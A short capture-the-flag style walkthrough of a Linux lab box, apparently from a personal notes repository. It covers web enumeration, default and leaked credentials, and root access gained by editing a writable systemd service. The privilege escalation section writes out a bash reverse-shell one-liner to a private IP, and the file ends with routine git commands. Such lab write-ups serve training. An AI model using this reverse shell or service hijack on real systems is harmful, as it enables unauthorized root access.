# 🕸️ SpiderSociety Walkthrough (Linux)

## 🧩 Initial Foothold

- Discovered the `/libspider` directory using `feroxbuster`.
- Logged in with default credentials:
  ```
  Username: admin
  Password: admin
  ```
- Navigated to the **Communications** section and found:
  ```
  FTP credentials: ss_ftpbckuser:ss_WeLoveSpiderSociety_From_Tech_Dept5937!
  ```
- Connected via `ftp` and browsed the `/libspider/` directory.
- Found a suspicious long filename that couldn’t be `cat`ed, so used:
  ```bash
  curl -i "http://192.168.163.214/libspider/.fuhfjkzbdsfuybefzmdbbzdcbhjzdbcukbdvbsdvuibdvnbdvenv"
  ```
- Extracted SSH credentials from that file:
  ```
  spidey:WithGreatPowerComesGreatSecurity99!
  ```

## 🚀 Privilege Escalation

- Ran `linpeas.sh`, which pointed to:
  ```
  /etc/systemd/system/spiderbackup.service
  ```
- The file was writable. Edited the `ExecStart` line:
  ```bash
  ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/192.168.45.194/80 0>&1'
  ```

- Then ran:
  ```bash
  sudo /bin/systemctl daemon-reload
  sudo /bin/systemctl restart spiderbackup.service
  ```

- Result: Got a reverse shell as **root** 🎉

---

## 📦 Git Commands

```bash
# Move the file to the walkthroughs folder
mv ~/Downloads/SpiderSociety.md ~/Downloads/walkthroughs_project_template/linux/SpiderSociety.md

# Navigate to the project directory
cd ~/Downloads/walkthroughs_project_template

# Stage changes
git add .

# Commit with a message
git commit -m "Added SpiderSociety (Linux) walkthrough"

# Push to GitHub
git push
```
